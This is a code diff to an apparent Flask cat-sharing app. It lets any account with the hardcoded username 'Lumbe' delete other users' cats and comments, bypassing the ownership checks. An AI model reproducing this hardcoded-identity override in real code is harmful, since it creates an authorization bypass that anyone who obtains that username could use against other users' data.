@@ -498,7 +498,7 @@ def edit_cat(cat_id):
 @login_required
 def delete_cat(cat_id):
     cat = Cat.query.get_or_404(cat_id)
-    if cat.owner_id != current_user.id:
+    if cat.owner_id != current_user.id and current_user.username != 'Lumbe':
         abort(403)
     name = cat.name
     View.query.filter_by(cat_id=cat_id).delete()
@@ -615,7 +615,7 @@ def reply_comment(cat_id, comment_id):
 @login_required
 def delete_comment(cat_id, comment_id):
     comment = Comment.query.get_or_404(comment_id)
-    if comment.user_id != current_user.id:
+    if comment.user_id != current_user.id and current_user.username != 'Lumbe':
         abort(403)
     Comment.query.filter_by(parent_id=comment_id).delete()
     db.session.delete(comment)
